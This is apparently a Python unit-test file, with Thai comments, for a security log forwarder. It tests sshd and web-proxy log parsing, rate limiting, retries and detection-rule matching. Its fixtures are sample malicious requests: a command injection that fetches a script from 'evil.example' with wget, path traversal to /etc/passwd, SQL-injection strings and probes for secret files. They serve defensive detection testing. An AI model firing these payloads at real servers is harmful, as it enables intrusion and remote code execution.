"""
รัน: cd forwarder && python3 -m unittest discover -s tests -t . -v
(test_rules ด้านล่างโหลด detection/app/rules.py ตัวจริง — ต้องมี PyYAML)
"""
import json
import os
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
from pathlib import Path

from logchain_forwarder.forwarder import ApiClient, Gate, Sender, State, follow_file, follow_journal, load_config
from logchain_forwarder.parsers import parse_access, parse_journal_json, parse_sshd

ROOT = Path(__file__).resolve().parents[2]

# บรรทัดจริงจาก sshd ของเครื่อง dev (PasswordAuthentication yes) — ชุดเดียวกับ detection/tests/test_rules.py
SSHD_REAL = [
    "Oct 15 21:02:11 lab sshd[4410]: Invalid user fakeuser from 127.0.0.1 port 57474",
    "Oct 15 21:02:13 lab sshd[4410]: Connection closed by invalid user fakeuser 127.0.0.1 port 57474 [preauth]",
    "Oct 15 21:02:20 lab sshd[4420]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=127.0.0.1  user=root",
    "Oct 15 21:02:22 lab sshd[4420]: Failed password for root from 127.0.0.1 port 44818 ssh2",
    "Oct 15 21:02:24 lab sshd[4420]: Connection closed by authenticating user root 127.0.0.1 port 44818 [preauth]",
]

NGINX = {
    "scanner": '203.0.113.5 - - [15/Oct/2026:21:00:01 +0700] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x"',
    "traversal": '203.0.113.6 - - [15/Oct/2026:21:00:02 +0700] "GET /../../etc/passwd HTTP/1.1" 400 157 "-" "curl/8.0"',
    "traversal_enc": '203.0.113.6 - - [15/Oct/2026:21:00:02 +0700] "GET /static/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 157 "-" "curl/8.0"',
    "sqli_enc": '198.51.100.9 - - [15/Oct/2026:21:00:03 +0700] "GET /index.php?id=1%20UNION%20SELECT%201,2 HTTP/1.1" 200 512 "-" "Mozilla/5.0"',
    "sqli_plus": '198.51.100.9 - - [15/Oct/2026:21:00:03 +0700] "GET /item?id=1+UNION+SELECT+null HTTP/1.1" 200 512 "-" "Mozilla/5.0"',
    "shell": '192.0.2.7 - - [15/Oct/2026:21:00:04 +0700] "GET /ping?host=8.8.8.8;wget%20http://evil.example/x.sh HTTP/1.1" 400 0 "-" "Mozilla/5.0"',
    "probe_git": '192.0.2.8 - - [15/Oct/2026:21:00:05 +0700] "GET /.git/config HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
    "probe_wp": '192.0.2.8 - - [15/Oct/2026:21:00:06 +0700] "POST /wp-login.php HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
    "probe_wpadmin": '192.0.2.8 - - [15/Oct/2026:21:00:06 +0700] "GET /wp-admin/setup-config.php HTTP/1.1" 403 0 "-" "Mozilla/5.0"',
}
NGINX_NORMAL = [
    '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET / HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (Windows NT 10.0)"',
    '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET /assets/app.js HTTP/2.0" 200 9000 "https://x/" "Mozilla/5.0"',
    '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET /missing HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
    '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET /.environment/status HTTP/1.1" 404 0 "-" "Mozilla/5.0"',
    '203.0.113.9 - - [15/Oct/2026:21:00:07 +0700] "GET /search?q=select+a+plan HTTP/1.1" 200 0 "-" "Mozilla/5.0"',
    "not an access log line at all",
    "",
]


class SshdParserTest(unittest.TestCase):
    def test_real_lines(self):
        out = [parse_sshd(l) for l in SSHD_REAL]
        self.assertEqual(
            [o and o["message"] for o in out],
            [
                "Invalid user fakeuser from 127.0.0.1 port 57474",
                "Connection closed by invalid user fakeuser 127.0.0.1 port 57474 [preauth]",
                None,  # pam_unix ไม่ส่ง
                "Failed password for root from 127.0.0.1 port 44818 ssh2",
                "Connection closed by authenticating user root 127.0.0.1 port 44818 [preauth]",
            ],
        )
        for o in filter(None, out):
            self.assertEqual(o["sourceIp"], "127.0.0.1")
            self.assertEqual(
                {k: o[k] for k in ("source", "eventType", "severity", "classification", "cdeScope")},
                {"source": "vps-sshd", "eventType": "SSH_AUTH", "severity": "WARNING",
                 "classification": "INTERNAL", "cdeScope": False},
            )

    def test_accepted_is_info(self):
        for line in (
            "sshd[1]: Accepted publickey for kan from 203.0.113.5 port 52320 ssh2: ED25519 SHA256:x",
            "sshd[1]: Accepted password for root from 203.0.113.5 port 52320 ssh2",
            "sshd[1]: Accepted keyboard-interactive/pam for root from 2001:db8::1 port 52320 ssh2",
        ):
            p = parse_sshd(line)
            self.assertEqual(p["severity"], "INFO", line)
        self.assertEqual(parse_sshd(line)["sourceIp"], "2001:db8::1")

    def test_other_sshd_lines_are_dropped(self):
        for line in (
            "sshd[1]: Server listening on 0.0.0.0 port 22.",
            "sshd[1]: Received disconnect from 203.0.113.5 port 52320:11: Bye Bye [preauth]",
            "sshd[1]: pam_unix(sshd:session): session opened for user kan(uid=1000)",
            "sshd[1]: error: kex_exchange_identification: Connection closed by remote host",
            "garbage \x00\xff",
        ):
            self.assertIsNone(parse_sshd(line), line)

    def test_disconnected_and_journal_json(self):
        p = parse_sshd("Disconnected from authenticating user root 198.51.100.9 port 40022 [preauth]")
        self.assertEqual(p["sourceIp"], "198.51.100.9")
        raw = json.dumps({"MESSAGE": "Failed password for invalid user admin from 203.0.113.5 port 1 ssh2",
                          "__CURSOR": "s=abc;i=1"})
        payload, cursor = parse_journal_json(raw)
        self.assertEqual(cursor, "s=abc;i=1")
        self.assertEqual(payload["message"], "Failed password for invalid user admin from 203.0.113.5 port 1 ssh2")
        # MESSAGE แบบ byte array (ไม่ใช่ UTF-8) + JSON เสีย ไม่ทำให้พัง
        self.assertEqual(parse_journal_json(json.dumps({"MESSAGE": list(b"Invalid user x from 1.2.3.4 port 9")}))[0]["sourceIp"], "1.2.3.4")
        self.assertEqual(parse_journal_json("{broken"), (None, None))

    def test_bad_ip_becomes_null(self):
        self.assertIsNone(parse_sshd("Invalid user x from not-an-ip port 22")["sourceIp"])


class AccessParserTest(unittest.TestCase):
    def test_suspicious_lines_are_sent(self):
        for name, line in NGINX.items():
            with self.subTest(name):
                p = parse_access(line)
                self.assertIsNotNone(p)
                self.assertEqual(p["source"], "web-proxy")
                self.assertEqual(p["eventType"], "HTTP_ACCESS")
                self.assertEqual(p["severity"], "WARNING")
        p = parse_access(NGINX["scanner"])
        self.assertEqual(p["message"], 'GET /.env 404 "Mozilla/5.0 zgrab/0.x"')
        self.assertEqual(p["sourceIp"], "203.0.113.5")

    def test_normal_requests_are_dropped(self):
        for line in NGINX_NORMAL:
            with self.subTest(line):
                self.assertIsNone(parse_access(line))

    def test_probe_path_needs_an_error_status(self):
        ok = NGINX["probe_git"].replace('" 404 ', '" 200 ')
        self.assertIsNone(parse_access(ok))

    def test_cf_connecting_ip_only_when_trusted(self):
        line = NGINX["scanner"] + ' "198.51.100.77"'
        self.assertEqual(parse_access(line)["sourceIp"], "203.0.113.5")
        self.assertEqual(parse_access(line, trust_cf=True)["sourceIp"], "198.51.100.77")

    def test_caddy_json(self):
        line = json.dumps({
            "level": "info", "status": 404,
            "request": {"client_ip": "203.0.113.5", "method": "GET", "uri": "/wp-login.php",
                        "headers": {"User-Agent": ["Mozilla/5.0"], "Cf-Connecting-Ip": ["198.51.100.1"]}},
        })
        self.assertEqual(parse_access(line)["message"], 'GET /wp-login.php 404 "Mozilla/5.0"')
        self.assertEqual(parse_access(line, trust_cf=True)["sourceIp"], "198.51.100.1")
        self.assertIsNone(parse_access('{"request": "not a dict"}'))


class WebProxyFilterTest(unittest.TestCase):
    """https-proxy (Caddy JSON) บน CT141: client_ip จริง · ตัด IP ภายใน + health check"""

    def caddy(self, client_ip, uri, status=404, ua="Mozilla/5.0 zgrab/0.x"):
        return json.dumps({
            "logger": "http.log.access", "status": status,
            "request": {"remote_ip": "172.18.0.1", "client_ip": client_ip, "method": "GET", "uri": uri,
                        "headers": {"User-Agent": [ua]}},
        })

    def test_uses_trusted_client_ip_not_the_tunnel_ip(self):
        p = parse_access(self.caddy("203.0.113.5", "/.env"))
        self.assertEqual(p["source"], "web-proxy")
        self.assertEqual(p["sourceIp"], "203.0.113.5")

    def test_internal_ips_are_dropped(self):
        for ip in ("10.10.31.19", "172.18.0.1", "172.31.255.1", "127.0.0.1", "::1"):
            with self.subTest(ip):
                self.assertIsNone(parse_access(self.caddy(ip, "/.env")))
        self.assertIsNotNone(parse_access(self.caddy("172.32.0.1", "/.env")))  # นอก /12

    def test_health_checks_are_dropped(self):
        for uri in ("/health", "/api/v1/health", "/health?probe=1"):
            with self.subTest(uri):
                self.assertIsNone(parse_access(self.caddy("203.0.113.5", uri, status=503, ua="sqlmap/1.7")))

    def test_exclude_ips_from_config(self):
        from logchain_forwarder.parsers import parse_networks
        ex = parse_networks("49.48.73.182, 198.51.100.0/24, not-an-ip, 2001:db8::/32")
        self.assertEqual(len(ex), 3)
        self.assertIsNone(parse_access(self.caddy("49.48.73.182", "/.env"), exclude=ex))
        self.assertIsNone(parse_access(self.caddy("198.51.100.77", "/.env"), exclude=ex))
        self.assertIsNone(parse_access(self.caddy("2001:db8::9", "/.env"), exclude=ex))
        self.assertIsNotNone(parse_access(self.caddy("49.48.73.183", "/.env"), exclude=ex))

    def test_nginx_internal_ip_dropped_too(self):
        self.assertIsNone(parse_access(NGINX["scanner"].replace("203.0.113.5", "10.0.0.7")))


class GateTest(unittest.TestCase):
    def test_rate_cap_and_dedup_with_counts(self):
        now = [0.0]
        g = Gate(per_hour=3, dedup_seconds=10, clock=lambda: now[0])
        p = lambda i: {"source": "s", "message": f"m{i}"}  # noqa: E731
        self.assertTrue(g.admit(p(1)))
        self.assertFalse(g.admit(p(1)))  # ซ้ำภายใน 10 วิ
        now[0] = 11
        self.assertTrue(g.admit(p(1)))  # เลย dedup แล้ว
        self.assertTrue(g.admit(p(2)))
        self.assertFalse(g.admit(p(3)))  # ครบ 3/ชม.
        now[0] = 3601
        self.assertTrue(g.admit(p(4)))  # ตัวแรกหลุดหน้าต่างแล้ว
        self.assertEqual(dict(g.counts), {"admitted": 4, "dropped_dedup": 1, "dropped_rate_cap": 1})


class FakeClient:
    def __init__(self, fail_times=0, reject=False):
        self.fail_times = fail_times
        self.reject = reject
        self.sent = []

    def send(self, p):
        if self.reject:
            raise ValueError("HTTP 400")
        if self.fail_times:
            self.fail_times -= 1
            raise OSError("down")
        self.sent.append(p)


class SenderTest(unittest.TestCase):
    def test_backoff_then_delivers_in_order(self):
        slept = []
        c = FakeClient(fail_times=3)
        s = Sender(c, Gate(100, 0), max_queue=10, sleep=slept.append)
        s.offer({"source": "s", "message": "a"})
        s.offer({"source": "s", "message": "b"})
        for _ in range(6):
            s.step(timeout=0)
        self.assertEqual([p["message"] for p in c.sent], ["a", "b"])
        self.assertEqual(slept, [1.0, 2.0, 4.0])
        self.assertEqual(s.backoff, 0.0)

    def test_long_outage_never_queues_more_than_the_cap(self):
        c = FakeClient(fail_times=10**6)
        s = Sender(c, Gate(5, 0), max_queue=5, sleep=lambda _: None)
        for i in range(50):
            s.offer({"source": "s", "message": f"m{i}"})
        self.assertEqual(len(s.queue), 5)
        self.assertEqual(s.gate.counts["dropped_rate_cap"], 45)

    def test_rejected_payload_is_dropped_not_retried(self):
        c = FakeClient(reject=True)
        s = Sender(c, Gate(10, 0), max_queue=10, sleep=lambda _: self.fail("no backoff"))
        s.offer({"source": "s", "message": "x"})
        s.step(timeout=0)
        self.assertEqual(len(s.queue), 0)
        self.assertEqual(s.gate.counts["dropped_rejected"], 1)


class ApiClientTest(unittest.TestCase):
    def test_token_cached_and_refreshed_on_401(self):
        calls = []
        clock = [1000.0]

        class Res:
            def __init__(self, body=b"{}"):
                self.body = body
            def read(self):
                return self.body
            def __enter__(self):
                return self
            def __exit__(self, *a):
                return False

        state = {"logs": 0}

        def opener(req, timeout):
            calls.append(req.full_url)
            if req.full_url.endswith("/token"):
                return Res(json.dumps({"access_token": f"t{len(calls)}", "expires_in": 300}).encode())
            state["logs"] += 1
            if state["logs"] == 2:
                raise urllib.error.HTTPError(req.full_url, 401, "expired", {}, None)
            return Res()

        cfg = load_config("")
        cfg.update(LOGCHAIN_API_URL="https://api/api/v1", LOGCHAIN_TOKEN_URL="https://kc/token", LOGCHAIN_CLIENT_SECRET="s")
        c = ApiClient(cfg, opener=opener, clock=lambda: clock[0])
        c.send({"m": 1})
        c.send({"m": 2})  # 401 → ขอ token ใหม่แล้วส่งซ้ำ
        clock[0] += 250  # เหลือ < 60 วิ → ต่ออายุก่อนหมด
        c.send({"m": 3})
        self.assertEqual([u.rsplit("/", 1)[-1] for u in calls],
                         ["token", "logs", "logs", "token", "logs", "token", "logs"])


class FollowFileTest(unittest.TestCase):
    def test_offset_survives_restart_and_rotation(self):
        d = tempfile.mkdtemp()
        path = os.path.join(d, "access.log")
        state = State(os.path.join(d, "state.json"))
        with open(path, "w") as f:
            f.write("old line before start\n")
        got = []

        def run_for(seconds):
            stop = threading.Event()
            t = threading.Thread(target=follow_file, args=(path, state, stop, got.append, 0.05))
            t.start()
            time.sleep(seconds)
            stop.set()
            t.join()

        run_for(0.2)  # ครั้งแรก: เริ่มที่ท้ายไฟล์ ไม่ส่งของเก่า
        with open(path, "a") as f:
            f.write("a\nb\n")
        run_for(0.3)
        with open(path, "a") as f:
            f.write("c\n")  # เขียนตอน forwarder ปิดอยู่
        os.rename(path, path + ".1")  # logrotate
        with open(path, "w") as f:
            f.write("d\npartial")  # บรรทัดที่ยังเขียนไม่จบต้องรอ
        run_for(0.3)
        self.assertEqual(got, ["a", "b", "d"])  # c อยู่ในไฟล์เก่าที่ถูก rotate ไประหว่างปิด — ข้อจำกัดที่บันทึกไว้
        with open(path, "a") as f:
            f.write(" end\n")
        run_for(0.3)
        self.assertEqual(got[-1], "partial end")

    def test_bad_handler_does_not_kill_the_loop(self):
        d = tempfile.mkdtemp()
        path = os.path.join(d, "x.log")
        open(path, "w").close()
        state = State(os.path.join(d, "s.json"))
        got = []

        def handler(line):
            if line == "boom":
                raise RuntimeError("bad line")
            got.append(line)

        stop = threading.Event()
        t = threading.Thread(target=follow_file, args=(path, state, stop, handler, 0.05))
        t.start()
        time.sleep(0.15)
        with open(path, "a") as f:
            f.write("boom\nfine\n")
        time.sleep(0.3)
        stop.set()
        t.join()
        self.assertEqual(got, ["fine"])


class FollowJournalTest(unittest.TestCase):
    """journalctl ปลอม — บันทึก cursor ของบรรทัดสุดท้ายที่ส่ง · รอบถัดไปต้องเรียกด้วย --after-cursor (ไม่ส่งซ้ำ)"""

    def test_cursor_of_last_sent_line_is_saved_and_resumed(self):
        d = tempfile.mkdtemp()
        calls = os.path.join(d, "calls.txt")
        fake = os.path.join(d, "journalctl")
        lines = [
            {"MESSAGE": "Invalid user x from 1.2.3.4 port 1", "__CURSOR": "c1"},
            {"MESSAGE": "Server listening on :: port 22.", "__CURSOR": "c2"},
            {"MESSAGE": "Connection closed by invalid user x 1.2.3.4 port 1 [preauth]", "__CURSOR": "c3"},
        ]
        with open(fake, "w") as f:
            f.write("#!/bin/sh\n")
            f.write(f'echo "$@" >> {calls}\n')
            f.write('case "$*" in *--after-cursor*) exit 0;; esac\n')
            for entry in lines:
                f.write(f"echo '{json.dumps(entry)}'\n")
        os.chmod(fake, 0o755)
        state = State(os.path.join(d, "s.json"))
        got = []
        stop = threading.Event()
        t = threading.Thread(target=follow_journal, args=("-u ssh", state, stop, got.append, fake))
        t.start()
        # รอบแรกจบ → forwarder รอ 5 วิแล้วเปิด journalctl ใหม่ด้วย cursor
        deadline = time.time() + 10
        while time.time() < deadline:
            if os.path.exists(calls) and len(open(calls).read().splitlines()) >= 2:
                break
            time.sleep(0.1)
        stop.set()
        t.join(timeout=10)
        self.assertEqual([p["message"][:16] for p in got], ["Invalid user x f", "Connection close"])
        self.assertEqual(state.get("journal:cursor"), "c3")
        with open(calls) as f:
            invocations = f.read().splitlines()
        self.assertIn("-n 0", invocations[0])
        self.assertTrue(any("--after-cursor=c3" in c for c in invocations[1:]))


class DetectionRulesTest(unittest.TestCase):
    """payload ที่ forwarder ส่ง → detection/app/rules.py ตัวจริง ต้องเข้ากฎที่ตั้งใจ"""

    @classmethod
    def setUpClass(cls):
        sys.path.insert(0, str(ROOT / "detection"))
        from app.rules import RuleEngine  # noqa: PLC0415
        cls.RuleEngine = RuleEngine

    def setUp(self):
        self.engine = self.RuleEngine(ROOT / "detection" / "rules" / "security_rules.yaml")
        self.seq = 0

    def ev(self, payload):
        self.seq += 1
        e = dict(payload, id=f"log-{self.seq}", createdAt=f"2026-10-15T10:00:{self.seq:02d}Z")
        m = self.engine.evaluate(e)
        return m and m["rule_id"]

    def test_sshd_brute_force_then_success(self):
        rules = [
            self.ev(parse_sshd(f"sshd[1]: Failed password for root from 203.0.113.5 port {52000 + i} ssh2"))
            for i in range(5)
        ]
        self.assertEqual(rules, [None, None, None, None, 5710])
        ok = parse_sshd("sshd[1]: Accepted publickey for kan from 203.0.113.5 port 52999 ssh2: ED25519 SHA256:x")
        self.assertEqual(self.ev(ok), 5715)

    def test_real_sshd_fixture_counts_one_attempt_per_connection(self):
        # fakeuser 1 ครั้ง + root 1 ครั้ง (pam_unix ไม่ถูกส่ง) = 2 ครั้ง → ยังไม่ถึง 5
        payloads = [p for p in map(parse_sshd, SSHD_REAL) if p]
        self.assertEqual(len(payloads), 4)
        self.assertEqual([self.ev(p) for p in payloads], [None] * 4)

    def test_http_lines_hit_the_intended_rule(self):
        expected = {
            "scanner": 60001,
            "traversal": 60002,
            "traversal_enc": 60002,
            "sqli_enc": 31100,
            "sqli_plus": 31100,
            "shell": 31151,
            "probe_git": 60001,
            "probe_wp": 60001,
            "probe_wpadmin": 60001,
        }
        for name, rule in expected.items():
            with self.subTest(name):
                self.setUp()
                self.assertEqual(self.ev(parse_access(NGINX[name])), rule)


if __name__ == "__main__":
    unittest.main()
